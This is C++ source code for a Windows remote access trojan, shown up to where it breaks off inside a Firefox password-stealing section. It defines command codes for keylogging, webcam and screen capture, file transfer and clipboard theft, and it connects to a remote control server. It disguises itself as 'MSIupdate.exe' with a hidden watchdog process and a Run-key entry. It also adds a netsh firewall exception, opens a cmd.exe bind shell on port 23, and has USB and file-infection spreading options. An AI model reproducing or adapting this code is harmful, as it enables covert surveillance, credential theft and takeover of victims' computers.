//#define WIN32_LEAN_AND_MEAN
//#define _WIN32_IE 0x0400
#define _WIN32_WINNT 0x0500

#include <winsock2.h>
#include <windows.h>
#include <winuser.h>
#include <windowsx.h>
#include <iostream>
#include <string>
#include <fstream>
#include <commctrl.h>
#include <stdio.h>
#include <tchar.h>
#include <malloc.h>
#include <vfw.h>
#include <userenv.h>
#include <ole2.h>
#include <objbase.h>
#include <olectl.h>
#include <Tlhelp32.h>
#include <string>
#include <vector>
#include <iostream>
#include <conio.h>
#include <Shellapi.h>
#include <gdiplus.h>
#include <GdiplusEnums.h>
#include <w32api.h>
#include <lm.h>
#include <Aclapi.h>
#include <Shlwapi.h>
#include <ntsecapi.h>
#include <wininet.h>
#include <time.h>


#include "acl.h"
#include "spread.h"
#include "sqlite3.h"



#pragma comment(lib,"userenv.lib")
#pragma comment(lib,"ws2_32.lib")
#pragma comment(lib, "vfw32.lib")
#pragma comment(lib,"Gdi32.lib ")
#pragma comment(lib,"GdiPlus.lib ")
#pragma comment(lib,"COMCTL32")
using namespace std;
using namespace Gdiplus;


#define BUFSIZE                   80
#define IDC_EDIT_OUT	       	  102
#define WM_SOCKET		          104
#define ID_MAIN_STATUS            105
#define WM_TRANSFER_SOCKET        106
#define WM_DLOAD_SOCKET           107

#define PING                      997
#define COMPUTER_INFO             1001
#define REQ_DRIVES                1002
#define SEND_DRIVES               1006
#define SEND_LOGS                 1007
#define TEST_CONNECTION           1008
#define CONFIRM_ONLINE            1009
#define LOGS_SENT                 1010
#define SEND_FILES                1011
#define REQ_FILES                 1012
#define REQ_TASKS                 1013
#define SEND_TASKS                1014
#define REQ_INSTALLS              1015
#define SEND_INSTALLS             1016
#define CAP_WEBCAM                1017
#define SEND_WEBCAM               1018
#define REQ_WINDOWS               1019
#define SEND_WINDOWS              1020
#define KILL_PROCESS              1021
#define EXECUTE_FILE              1022
#define DOWNLOAD_FILE             1023
#define DELETE_FILE               1024
#define IEXECUTE_FILE             1025
#define IDOWNLOAD_FILE            1026
#define IDELETE_FILE              1027
#define REQ_FILE_SEARCH           1028
#define SEND_FILE_SEARCH          1029
#define REQ_SEARCH_DIR            1030
#define SEND_SEARCH_DIR           1031
#define CAP_SCREEN                1032
#define TURN_OFF_PC               1033
#define TURN_ON_PC                1034
#define SHUT_DOWN_PC              1035
#define LOG_OFF_PC                1036
#define SEND_FOLDERS              1037
#define SET_CAP_SCREEN            1038
#define SET_CAP_CAM               1039
#define END_CAP_SCREEN            1040
#define END_CAP_CAM               1041
#define SET_KEYLOG                1042
#define END_KEYLOG                1043
#define SET_FDLOAD                1044
#define FDLOAD                    1045
#define END_FDLOAD                1046
#define SET_FUPLOAD               1047
#define FUPLOAD                   1048
#define END_FUPLOAD               1049
#define NEW_FOLDER                1050
#define RENAME_FILE               1051
#define COPYnPASTE_FILE           1052
#define INIT_DLFSOCK              1053
#define INIT_FSOCK                1054
#define CANCEL_DLOAD              1055
#define PAUSE_DLOAD               1056
#define RESUME_DLOAD              1057
#define CANCEL_SHOT               1058
#define PAUSE_SHOT                1059
#define RESUME_SHOT               1060
#define REQ_SRVCS                 1061
#define SEND_SRVCS                1062
#define DLOAD_SUSPENDED           1063
#define DLOAD_TERMINATED          1064
#define DLOAD_RESUMED             1065
#define REQ_DATABASE              1066
#define SEND_DATABASE             1067
#define STOP_SERVICE              1068
#define START_SERVICE             1069
#define REQ_REG_MAN               1070
#define SEND_REG_MAN              1071
#define SEND_FILE_SEARCHNUM       1072
#define REQ_SEC_PASS              1073
#define SEND_SEC_PASS             1074
#define AUTH_FAIL                 1075
#define BROWSE_WEB                1076
#define SCAN_PORT                 1077
#define REQ_AUTO_SOCK             1078
#define SEND_AUTO_SOCK            1079
#define REQ_CLIP_BOARD            1080
#define SEND_CLIP_BOARD           1081
#define EMPTY_CLIP_BOARD          1082
#define PASTE_CLIP_BOARD          1083
#define COPY_CLIP_BOARD           1084


#define WM_CAP_START  0x0400
#define WM_CAP_DRIVER_CONNECT  (WM_CAP_START + 10)
#define WM_CAP_DRIVER_DISCONNECT  (WM_CAP_START + 11)
#define WM_CAP_EDIT_COPY (WM_CAP_START + 30)
#define WM_CAP_GRAB_FRAME (WM_CAP_START + 60)
#define WM_CAP_SET_SCALE (WM_CAP_START + 53)
#define WM_CAP_SET_PREVIEWRATE (WM_CAP_START + 52)
#define WM_CAP_SET_PREVIEW (WM_CAP_START + 50)
#define WM_CAP_DLG_VIDEOSOURCE  (WM_CAP_START + 42)
#define WM_CAP_STOP (WM_CAP_START+ 68)


 #define   SHTDN_REASON_MAJOR_OPERATINGSYSTEM 4111
 #define   SHTDN_REASON_MINOR_UPGRADE 4222
 #define   SHTDN_REASON_FLAG_PLANNED 4333

 #define   MAX_LEN 5444

#define MAX_KEY_LENGTH 566
#define MAX_VALUE_NAME 16383
#define MAX_LOADSTRING 100
#define HIMETRIC_INCH	2540
#define MAP_LOGHIM_TO_PIX(x,ppli)   ( ((ppli)*(x) + HIMETRIC_INCH/2) / HIMETRIC_INCH )

#define		NETSH_ADD_1			"netsh firewall set allowedprogram "
//#define		NETSH_ADD_2			" INTIFADA_RAT ENABLE"
#define		REGKEY			"Software\\Microsoft\\Windows\\CurrentVersion\\Run"


#define		SHELL32_DLL			"shell32.dll"
#define		KERNEL32_DLL		"kernel32.dll"

#define FILE_BUFF_SZ 0xFF

#define DLLEXPORT __declspec(dllexport)




#define Alloc(p,t) (t *)malloc((p)*sizeof(t))
#define For(i,n) for ((i)=0;(i)<(n);(i)++)
#define iFor(n) For (i,n)
#define jFor(n) For (j,n)




typedef void (WINAPI *PGNSI)(LPSYSTEM_INFO);



void GetProcessor();
void GetTotalRAM();
void Getcountry();
void GetUserInfo();
int test_key(void);
int create_key(char *);
void SendDrives();
BOOL IsAdmin();
int Admin();
void ScreenRes();
void LogOff();
BOOL MySystemShutdown();
BOOL KillProcess(char *ProcessName);
void TurnMonitorOff();
void TurnMonitorOn();
int enumservices();
int QueryInstalls();
void InvertScreen();
void SetAccessRights();
static DWORD WINAPI AddSelfToRun(char *mode);
void InitKL();
void InitCaps();
DWORD startService(char *pServiceName);
DWORD stopService(char *pServiceName);
int InfectExes(void);
int InfectALL(void);
int SetClipboard(char *PasteClip);
int GetClipboard();


HKEY hTestKey;




struct PACKETHEAD
{
    DWORD PacketType;
    ///USER INFO///
    char IP_add[12];
    char cpt_name[70];
    char OS_Ver[50];
    char User[70];
    char Admin[18];
    char Processor_specs[50];
    char RAM_Size[10];
    char Scr_res[15];
    char Time[20];
    ///FILE SYS///
    char Drives[4];
    char Folder[50];
    char File[100];
    char FileSize[25];
    int  File_type;
    char Installs[50];
    char Path[MAX_PATH];
    char FoundFile[MAX_PATH];
    int  FoundNum;
    int  DriveType;
    //char FoundDir[MAX_PATH];
    ///TASK MNGR///
    char Procs[100];
	char PID[7];
	char Threads[7];
	char ParentPID[7];
	char PRIORITY[10];
	char Windows[50];
	char PhyMem[30];
	///SCAN PORT///
	char ScanIP[16];
	char ScanPort[7];
	char ScanStat[7];
	int  ScanImg;
	///SRVC MNGR///
	char Srvcname[70];
	char SrvcDispname[70];
	char SrvcStatus[20];
	char SrvcStartup[15];
	///REG MNGR///
	int RegID;
	char KeyVal[25];
	int datatype;
	char keydata[150];
	char KeyFold[50];
};




struct EVENTPACKET
{
    DWORD PacketType;
    ///AUTO_PORT///
    int UPort;
    int FPort;
    ///SECURITY//////
    char SEC_PASS[14];
    ///STD//////////////
    char URL[256];
    char TaskName[100];
    char SrvcName[100];
    char FileName[100];
    char Ipath[MAX_PATH];
    char Dpath[MAX_PATH];
    char SearchFile[MAX_PATH];
    //char SearchExtention[MAX_PATH];
    char SearchDir[MAX_PATH];
    char Fcopy[MAX_PATH];
    char Fpaste[MAX_PATH];
    ///REGMAN//////////
    int Hkey_ID;
    char KeyPath[MAX_PATH];
    ///PORT SCAN//////////
    DWORD StartIp;
	DWORD EndIp;
	DWORD StartPort;
	DWORD EndPort;
    ///CLIP BOARD///
	char cliptext[1024];
};



struct FTRANSFER
{
    DWORD PacketType;
    //CAPTURES//
    char Scr_Cap[5041];
    char Cam_Cap[2041];
    char Keylog[3041];
    char ClipBoard[1024];
    unsigned long PicLen;
    unsigned long ActPicLen;
    char PicSize[50];
    int infusb;
    int infexe;
};



struct FILEUPLOAD
{
    DWORD PacketType;
    char FUload[5041];
    char ULFname[MAX_LEN];
    char ULDestPath[MAX_PATH];
    unsigned long ULFLen;
    char ULFSize[50];
};


struct FILEDOWNLOAD
{
    DWORD PacketType;
    char FDload[4096];
    unsigned long DLFLen;
    char DLFSize[50];
};


typedef struct FFIND
{
	char filename[100];
	char dirname[100];
	int threadnum;
	BOOL silent;
	BOOL gotinfo;

} FFIND;



typedef struct {
 WORD x,y;  // dimensions
 WORD l;    // bytes per scan-line (32-bit allignment)
 BYTE *b;   // bits of bitmap,3 bytes/pixel, BGR
} tWorkBMP;  // 24-bit working bitmap





ULONG_PTR gdiplusToken;

char *szServer=/*"127.0.0.1";*/"256.256.256.256";
char nPort[10]=/*"5455";*/"55554";
char FPort[10]="55555";
char DLPort[10]="55556";

HWND hEditOut=NULL;
SOCKET Socket=NULL;
SOCKET FSocket=NULL;
SOCKET DLSocket=NULL;



int statwidths[] = {165, -1};
char* buf = (char*)malloc(100);
char Buffer [1024];
char Country[80];
char UserName[100];
char admin[20];
char cp_name[255];
char ResultRes [100];
int SCREENX;
int SCREENY;
char dir[MAX_PATH]="";
int nIndex;
char Buf [100] = "";
char Buf2 [100] = "";
int L;
DWORD thread;

HANDLE WindowLog;

HHOOK theHook;
FILE *file;
char f_buff[FILE_BUFF_SZ];
int buff_idx;
HANDLE FileHandle;
char *Time;
DWORD numb_bytes;
BOOL KeyConnect = 0;
char FileNameA[15] = "keylog.txt";
int	 KEYID = 0;
HANDLE KeyLog;
int ULSizeCheck = 0;
int ULfilesize = 0;
char ULfilename[MAX_LEN];
FILE* UPLFILE;
char UPLpath[MAX_PATH];
HANDLE FileSendHandle;
char wootdir[MAX_PATH];
int CamOn=0;
MEMORYSTATUS Memory;

char AuthPassFail[10];


char EXENAME[]="MSIupdate.exe";
char REGNAME[]="MSIupdate";
char PROTECTORNAME[]="Winsxs.exe";

char FirstModErr[]="ERRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRRORRRRRRRRRRRRRRRRRRRRRRRR";
char ErrTitle[]="ERRTITLEXXXXXXXXXXXXXX";
char SECPASSKEY[]="xPxAxSxSxKxExYx";


char InfUSBsDB[10],InfEXEsDB[10];


PACKETHEAD      SEND;
DWORD	        HeadSize=sizeof(PACKETHEAD);

EVENTPACKET		Recv;
DWORD			RecvSize=sizeof(EVENTPACKET);

FTRANSFER       FSEND;
DWORD			FHeadSize=sizeof(FTRANSFER);

FTRANSFER       FRECV;
DWORD			FRecvSize=sizeof(FTRANSFER);

FILEDOWNLOAD    DLSEND;
DWORD			DLHeadSize=sizeof(FILEDOWNLOAD);


FILEUPLOAD      ULRECV;
DWORD           ULRecvSize= sizeof(FILEUPLOAD);



char szAppName [] = TEXT("WebCam");
HWND camhwnd;
HDC hdc,hdcMem;
HDC hWindowdc,hBitmapdc;
PAINTSTRUCT ps;
HBITMAP hbm;
RECT rc;

//HBITMAP hBitmap = NULL;
char vvdir[MAX_PATH];
char vvvdir[MAX_PATH];


char Spread2USB[20]="USBSPREAD_OFF";
char Show1stModErr[20]="SHO1STMODERR_OFF";
char SetSecurityPass[20]="SECURITYPASS_OFF";
char isAutoSocket[20]="AUTO_SOCK_OFF";
//char InfectFiles[20]="FILESPREAD_OFF"; //FILESPREAD_EXE // FILESPREAD_ALL


int ProtectMe()
{
   HANDLE Snap;
   PROCESSENTRY32 proc32;
   int checkMe = 0;
   int checkKey;
   HKEY hKey;
   char path[BUFSIZE];
   DWORD buf_length=BUFSIZE;
   int reg_key;
   HKEY hkey2;



 Repeat:

    Snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);//take a snap of all processes

    if(Snap==INVALID_HANDLE_VALUE)
    {
        return EXIT_FAILURE;
    }

    proc32.dwSize=sizeof(PROCESSENTRY32); //set size of structure
    //GetModuleFileName(GetModuleHandle(NULL), name, 256);


     while((Process32Next(Snap,&proc32))==TRUE)
     {
        if(strcmp(EXENAME,proc32.szExeFile)==0)
        {
            checkMe += 1;
        }
     }

    if(checkMe>=1)
    {

        checkMe = 0;
        Sleep(2000);
        goto NeXt;
    }

    if(checkMe<1);
    {
      if(ShellExecute(NULL, "open", vvdir, NULL, NULL, SW_SHOWDEFAULT)!=0)
      {
        CopyFile(vvvdir, vvdir, FALSE);
        goto Repeat;
      }
      Sleep(2000);
      checkMe = 0;
      goto NeXt;

    }

NeXt:

    reg_key=RegOpenKeyEx(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",0,KEY_QUERY_VALUE,&hKey);
    if(reg_key!=0)
    {
        checkKey=1;
    }

    reg_key=RegQueryValueEx(hKey,REGNAME,NULL,NULL,(LPBYTE)path,&buf_length);

    if((reg_key!=0)||(buf_length>BUFSIZE))
    {

        reg_key=RegCreateKey(HKEY_LOCAL_MACHINE,"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run",&hkey2);
        if(reg_key==0)
        {
            RegSetValueEx((HKEY)hkey2,REGNAME,0,REG_SZ,(BYTE *)vvdir,strlen(vvdir));
            RegCloseKey(hKey);
            Sleep(2000);
            goto Repeat;
        }

    }

    if(reg_key==0)
    {
    RegCloseKey(hKey);
    Sleep(2000);
    goto Repeat;
    }


}



/*DWORD WINAPI LookOver(LPVOID param)
{

   HANDLE Snap;
   PROCESSENTRY32 proc32;
   int checkMe = 0;

 Repeat:

    Snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);//take a snap of all processes

    if(Snap==INVALID_HANDLE_VALUE)
    {
        return EXIT_FAILURE;
    }

    proc32.dwSize=sizeof(PROCESSENTRY32); //set size of structure
    //GetModuleFileName(GetModuleHandle(NULL), name, 256);

     while((Process32Next(Snap,&proc32))==TRUE)
     {
        if(strcmp(PROTECTORNAME,proc32.szExeFile)==0)
        {
            checkMe += 1;
        }
     }

    if(checkMe=1)
    {
        checkMe = 0;
        Sleep(2000);
        goto Repeat;
    }

    if(checkMe<1);
    {
      ShellExecute(NULL, "open", vvvdir, NULL, NULL, SW_SHOWDEFAULT);
      checkMe = 0;
      Sleep(2000);
      goto Repeat;
    }

    if(checkMe>1)
    {
        KillProcess(PROTECTORNAME);
        ShellExecute(NULL, "open", vvvdir, NULL, NULL, SW_SHOWDEFAULT);
        checkMe = 0;
        Sleep(2000);
        goto Repeat;
    }

}*/


int InitMe()
{

    int i=0;
    int j=0;
    int k=0;
    char Data[MAX_PATH];
    char Data2[MAX_PATH];
    char name[256];
    char myname[256];
    HANDLE hHandle = 0;
    DWORD Buffsize = MAX_PATH;
    HANDLE Snap;
    PROCESSENTRY32 proc32;
    int checkP = 0;

    //char vvvdir[MAX_PATH];

    ZeroMemory(&myname[0],sizeof(myname));
    ZeroMemory(&name[0],sizeof(name));
    ZeroMemory(&Data2[0],sizeof(Data2));
    ZeroMemory(&Data[0],sizeof(Data));



    if(OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&hHandle));
    GetUserProfileDirectory(hHandle,wootdir,&Buffsize);


    GetModuleFileName(GetModuleHandle(NULL), name, 256);

    lstrcpy(vvvdir,wootdir);
    lstrcat(vvvdir,"\\");
    lstrcat(vvvdir,PROTECTORNAME);

    lstrcpy(vvdir,wootdir);
    lstrcat(vvdir,"\\");
    lstrcat(vvdir,EXENAME);



			for(i=0; i<strlen(name); i++)
           {

                  if(name[i] == '\\')
				  {
                     name[i] = '/';
				  }
           }
               strcpy(Data, name);

               i = strlen(Data);

               while(Data[i] != '/')
			   {
                  i--;
                  Data2[j] = Data[i];
                  j++;
			   }
               i++;
               //j--;
               int x;
               for(k=(strlen(Data2)-2);k>=0;k--)
			   {

                  myname[x] = Data2[k];
                  x++;
               }


    if(strcmp(myname,EXENAME)==0)
    {

    Snap=CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS,0);//take a snap of all processes

    if(Snap==INVALID_HANDLE_VALUE)
    {
        //return EXIT_FAILURE;
    }

    proc32.dwSize=sizeof(PROCESSENTRY32); //set size of structure
    //GetModuleFileName(GetModuleHandle(NULL), name, 256);


     while((Process32Next(Snap,&proc32))==TRUE)
     {
        if(strcmp(PROTECTORNAME,proc32.szExeFile)==0)
        {
         checkP += 1;
        }
     }
      if(checkP>=1)
      {
       checkP = 0;
      }

      else if(checkP<1)
      {
       ShellExecute(NULL, "open", vvvdir, NULL, NULL, SW_SHOWDEFAULT);
       checkP = 0;

      }


    }

    else if(strcmp(myname,PROTECTORNAME)==0)
    {
      ProtectMe();
    }

    else
    {
       if(strstr(Show1stModErr,"SHO1STMODERR_ON"))
       {
           MessageBox(NULL,FirstModErr,ErrTitle, MB_OK|MB_ICONERROR);
       }


    /* if(strstr(InfectFiles,"FILESPREAD_ALL"))
     {
     InfectALL();
     }

     if(strstr(InfectFiles,"FILESPREAD_EXE"))
     {
     InfectExes();
     }*/

    //SetAccessRights();
    AddSelfToRun("addtorun");
    // InfectExes();

    if(ShellExecute(NULL, "open", vvdir, NULL, NULL, SW_SHOWNORMAL))
    {
     KillProcess(myname);
    }

   }


}




void Connect(HWND hWnd)
{
            int ConRes;

 			WSADATA WsaDat;
			int nResult=WSAStartup(MAKEWORD(2,2),&WsaDat);
			if(nResult!=0)
			{

			}

			begin:

			Socket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
			if(Socket==INVALID_SOCKET)
			{
			    //Sleep(1000);
				goto begin;
			}



            struct hostent *host;
			if((host=gethostbyname(szServer))==NULL)
			{
			    goto begin;
			}

		    SOCKADDR_IN SockAddr;
			SockAddr.sin_port=htons(atoi(nPort));
			SockAddr.sin_family=AF_INET;
			SockAddr.sin_addr.s_addr=*((unsigned long*)host->h_addr);

			ConRes = connect(Socket,(LPSOCKADDR)(&SockAddr),sizeof(SockAddr));

			if (ConRes==-1)
			{
             Sleep(3000);
			 goto begin;
			}



			nResult=WSAAsyncSelect(Socket,
					hWnd,
					WM_SOCKET,
					(FD_CLOSE|FD_CONNECT|FD_READ));
			if(nResult)
			{
				goto begin;
			}


}



//////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////



void Transfer_Connect(HWND hWnd)
{
            int ConRes;

 			WSADATA WsaDat;
			int nResult=WSAStartup(MAKEWORD(2,2),&WsaDat);
			if(nResult!=0)
			{

			}

			begin:

			FSocket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
			if(FSocket==INVALID_SOCKET)
			{
				goto begin;
			}



            struct hostent *host;
			if((host=gethostbyname(szServer))==NULL)
			{
			    goto begin;
			}

		    SOCKADDR_IN SockAddr;
			SockAddr.sin_port=htons(atoi(FPort));
			SockAddr.sin_family=AF_INET;
			SockAddr.sin_addr.s_addr=*((unsigned long*)host->h_addr);

			ConRes = connect(FSocket,(LPSOCKADDR)(&SockAddr),sizeof(SockAddr));

			if (ConRes==-1)
			{
			 goto begin;
			}



			nResult=WSAAsyncSelect(FSocket,
					hWnd,
					WM_TRANSFER_SOCKET,
					(FD_CLOSE|FD_CONNECT|FD_READ));
			if(nResult)
			{
				goto begin;
			}


}




void Download_Connect(HWND hWnd)
{
            int ConRes;

 			WSADATA WsaDat;
			int nResult=WSAStartup(MAKEWORD(2,2),&WsaDat);
			if(nResult!=0)
			{

			}

			begin:

			DLSocket=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP);
			if(DLSocket==INVALID_SOCKET)
			{
				goto begin;
			}



            struct hostent *host;
			if((host=gethostbyname(szServer))==NULL)
			{
			    goto begin;
			}

		    SOCKADDR_IN SockAddr;
			SockAddr.sin_port=htons(atoi(DLPort));
			SockAddr.sin_family=AF_INET;
			SockAddr.sin_addr.s_addr=*((unsigned long*)host->h_addr);

			ConRes = connect(DLSocket,(LPSOCKADDR)(&SockAddr),sizeof(SockAddr));

			if (ConRes==-1)
			{
			 goto begin;
			}



			nResult=WSAAsyncSelect(DLSocket,
					hWnd,
					WM_DLOAD_SOCKET,
					(FD_CLOSE|FD_CONNECT|FD_READ));
			if(nResult)
			{
				goto begin;
			}


}




void GetTime()
{
  time_t rawtime;
  struct tm * timeinfo;

  time ( &rawtime );
  timeinfo = localtime ( &rawtime );

  Time = asctime (timeinfo);

}


static DWORD WINAPI AddSelfToRun(char *mode)
{
	HKEY hkey, zhkey;
	char str[256], sysbuf[256], myname[256], myprotector[256], kernl[256];
	HANDLE hTimeFile, hTimeFile2;
	FILETIME aFileTime, bFileTime, cFileTime;
	GetModuleFileName(GetModuleHandle(NULL), str, 256);

    HANDLE hHandle = 0;
    char sZbuf[MAX_PATH];
    DWORD Buffsize = MAX_PATH;
    if(OpenProcessToken(GetCurrentProcess(),TOKEN_QUERY,&hHandle));
    GetUserProfileDirectory(hHandle,sZbuf,&Buffsize);

	GetSystemDirectory(sysbuf, 256);
	lstrcpy(myname,sZbuf);
	lstrcpy(myprotector,sZbuf);
	//lstrcat(myname,"\\AppData\\Roaming\\Microsoft");
	lstrcat(myname, "\\");
	lstrcat(myprotector, "\\");
	lstrcat(myname, EXENAME);
	lstrcat(myprotector, PROTECTORNAME);

    if(lstrcmp(mode,"addtorun")==0) // прописываем себя в автозагрузку
	{
		if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, REGKEY, 0, KEY_WRITE,&hkey)==ERROR_SUCCESS)
			{
			 // получаем дату создания kernel32.dll
				/*lstrcpy(kernl, sysbuf); lstrcat(kernl, "//");  lstrcat(kernl, KERNEL32_DLL);
				hTimeFile = CreateFile(kernl, GENERIC_READ, FILE_SHARE_READ, 0,
											  OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

				if (hTimeFile != INVALID_HANDLE_VALUE)
				{
					GetFileTime(hTimeFile, &aFileTime, &bFileTime, &cFileTime);
					CloseHandle(hTimeFile);
				}*/

				CopyFile(str, myname, FALSE);
				CopyFile(str, myprotector, FALSE);

				hTimeFile = CreateFile(myname, GENERIC_WRITE, FILE_SHARE_WRITE, 0,
							OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

				SetFileAttributes(myname, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);



				// устанавливаем себе дату создания kernel32.dll, чтобы меньше светиться в том случае,
				// если сплайсинг работать не будет (например, загрузка ОС в Safe Mode).

				if (hTimeFile != INVALID_HANDLE_VALUE)
				{
					SetFileTime(hTimeFile, &aFileTime, &bFileTime, &cFileTime);
					CloseHandle(hTimeFile);
				}


				hTimeFile2 = CreateFile(myprotector, GENERIC_WRITE, FILE_SHARE_WRITE, 0,
							OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

				SetFileAttributes(myprotector, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_READONLY | FILE_ATTRIBUTE_SYSTEM);


				if (hTimeFile2 != INVALID_HANDLE_VALUE)
				{
					SetFileTime(hTimeFile2, &aFileTime, &bFileTime, &cFileTime);
					CloseHandle(hTimeFile2);
				}

				// пишем себя в реестр
				if (RegSetValueEx((HKEY)hkey,REGNAME, 0,REG_SZ, (BYTE *)myname, lstrlen(myname)) == ERROR_SUCCESS);
				{
					RegCloseKey(hkey);
				}
			}
	}
	else if(lstrcmp(mode, "killmyself")==0) // удаляемся из автозагрузки
	{
		if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, REGKEY, 0, KEY_WRITE,&zhkey)==ERROR_SUCCESS)
			{
				RegDeleteValue(zhkey, REGNAME);
				RegCloseKey(zhkey);
			}
	}
    CloseHandle(hHandle);
	return 0;
}






void SetAccessRights()
{
	char	lpUserName[50], lpGroupName[100], lpDriverDirectory[MAX_PATH], lpSysDirectory[MAX_PATH];
	DWORD	nSize = sizeof(lpUserName);

	LPLOCALGROUP_USERS_INFO_0 pBuf = NULL;
	DWORD   dwEntriesRead = 0;
	DWORD   dwTotalEntries = 0;
	NET_API_STATUS   nStatus;
	WCHAR wUserName[100];

	ZeroMemory(lpUserName, sizeof(lpUserName));
	ZeroMemory(lpDriverDirectory, sizeof(lpDriverDirectory));
	ZeroMemory(lpSysDirectory, sizeof(lpSysDirectory));
	GetSystemDirectory(lpSysDirectory, sizeof(lpSysDirectory));
	GetSystemDirectory(lpDriverDirectory, sizeof(lpDriverDirectory));
	lstrcat(lpDriverDirectory, "\\Drivers");
	GetUserName(lpUserName, &nSize);
	// 设置成员权限
	AddAccessRights(lpSysDirectory, lpUserName, GENERIC_ALL);
	AddAccessRights(lpDriverDirectory, lpUserName, GENERIC_ALL);
	MultiByteToWideChar( CP_ACP, 0, lpUserName, -1, wUserName, sizeof(wUserName) / sizeof(wUserName[0]));

	nStatus = NetUserGetLocalGroups(NULL,
		(LPCWSTR)wUserName,
		0,
		LG_INCLUDE_INDIRECT,
		(LPBYTE   *) &pBuf,
		MAX_PREFERRED_LENGTH,
		&dwEntriesRead,
		&dwTotalEntries);

	if (nStatus == NERR_Success)
	{
		LPLOCALGROUP_USERS_INFO_0 pTmpBuf;
		DWORD i;

		if ((pTmpBuf = pBuf) != NULL)
		{
			for (i = 0; i < dwEntriesRead; i++)
			{
				if (pTmpBuf == NULL)
					break;
				WideCharToMultiByte(CP_OEMCP, 0, (LPCWSTR)pTmpBuf->lgrui0_name, -1, (LPSTR)lpGroupName, sizeof(lpGroupName), NULL, FALSE);
				// 设置组的权限
				AddAccessRights(lpSysDirectory, lpGroupName, GENERIC_ALL);
				AddAccessRights(lpDriverDirectory, lpGroupName, GENERIC_ALL);
				pTmpBuf++;
			}
		}
	}
	if (pBuf != NULL)
		NetApiBufferFree(pBuf);

}



static DWORD WINAPI NetSHFirewallReg()
{

	char fireexec[256], my_path[256];
	GetModuleFileName(0, my_path, 256);

		lstrcpy(fireexec, NETSH_ADD_1);
		lstrcat(fireexec,  my_path);
		//lstrcat(fireexec, NETSH_ADD_2);
		lstrcat(fireexec, EXENAME);
		lstrcat(fireexec, " ");
		lstrcat(fireexec, "ENABLE");

	WinExec(fireexec, SW_HIDE);
	return 0;

}




////////////////////////////////////////////////////////////////////////////////////
//CMD
	char Command [1024] = "";
	int SHELLSTART = 0;
DWORD WINAPI Shell(LPVOID lParam)
{
	SHELLSTART = 1;
    WSADATA wsadata;
    SOCKET shellsock, sendsock;
    SOCKADDR_IN sin;
    HANDLE hPipeRead1, hPipeWrite1, hPipeRead2, hPipeWrite2;
    char szBuffer[4096], szCmdPath[MAX_PATH];
    int i, count = 0;
	int port = 23;
    DWORD lpNumberOfBytesRead;
    SECURITY_ATTRIBUTES secu =
    {
        (DWORD)sizeof(SECURITY_ATTRIBUTES), NULL, TRUE
    };
    STARTUPINFO sInfo;
    PROCESS_INFORMATION pInfo;
        WSAStartup(MAKEWORD(2,2), &wsadata);
        sin.sin_family = AF_INET;
        sin.sin_addr.s_addr = 0;
        sin.sin_port = htons(port);
        i = sizeof (sin);
        shellsock = socket (AF_INET, SOCK_STREAM, 0);
        bind(shellsock, (SOCKADDR *)&sin, sizeof(sin));
        listen(shellsock, 0);
        sendsock = accept(shellsock,(SOCKADDR *)&sin, &i);


        CreatePipe(&hPipeRead1, &hPipeWrite1, &secu, 0);
        CreatePipe(&hPipeRead2, &hPipeWrite2, &secu, 0);
        GetEnvironmentVariable("ComSpec", szCmdPath, sizeof(szCmdPath));
        memset(&sInfo, 0, sizeof(sInfo));
        memset(&pInfo, 0, sizeof(pInfo));
        sInfo.cb=sizeof (STARTUPINFO);
        sInfo.dwFlags=STARTF_USESHOWWINDOW+STARTF_USESTDHANDLES;
        sInfo.wShowWindow=SW_SHOW;
        sInfo.hStdInput = hPipeRead2;
        sInfo.hStdOutput = hPipeWrite1;
        sInfo.hStdError = hPipeWrite1;

        CreateProcess(NULL, szCmdPath, &secu, &secu, TRUE, 0, NULL, NULL, &sInfo, &pInfo);

    while (sendsock != SOCKET_ERROR)
    {
            Sleep (100);
            memset(szBuffer, 0, sizeof(szBuffer));
            PeekNamedPipe(hPipeRead1, NULL, NULL, NULL, &lpNumberOfBytesRead, NULL);
		//	sprintf(Test, "PeekNamedPipe out side lpNumberOfBytesRead: %d \n", lpNumberOfBytesRead);
		//	printf(Test);
        while (lpNumberOfBytesRead)
        {
                Sleep (200);
            if (!ReadFile(hPipeRead1, szBuffer, sizeof(szBuffer), &lpNumberOfBytesRead, NULL)) break;
            else send(sendsock, szBuffer, lpNumberOfBytesRead, 0);
//			sprintf(Test, "sendsock-lpNumberOfBytesRead: %d \n", lpNumberOfBytesRead);
//			printf(Test);
            PeekNamedPipe(hPipeRead1, NULL, NULL, NULL, &lpNumberOfBytesRead, NULL);
			//		sprintf(Test, "PeekNamedPipe-lpNumberOfBytesRead: %d \n", lpNumberOfBytesRead);
			//printf(Test);

        }
            Sleep (200);
            i = recv (sendsock,szBuffer,sizeof(szBuffer),0);

			WriteFile(hPipeWrite2, szBuffer, i, &lpNumberOfBytesRead, 0);
    }
        closesocket(sendsock);
        closesocket(shellsock);
		WSACleanup();
		SHELLSTART = 0;
		TerminateProcess(pInfo.hProcess, 0);
        return 0;
}





/*char FFbuffer1[10240];
char FFbuffer2[10240];
char FFbuffer3[10240];


////////////////////////////////////////////////////////////////////////////
//FireFox passwords Credits to Krippler
//Firefox internal SEC structures
typedef enum SECItemType
{
    siBuffer = 0,
    siClearDataBuffer = 1,
    siCipherDataBuffer = 2,
    siDERCertBuffer = 3,
    siEncodedCertBuffer = 4,
    siDERNameBuffer = 5,
    siEncodedNameBuffer = 6,
    siAsciiNameString = 7,
    siAsciiString = 8,
    siDEROID = 9,
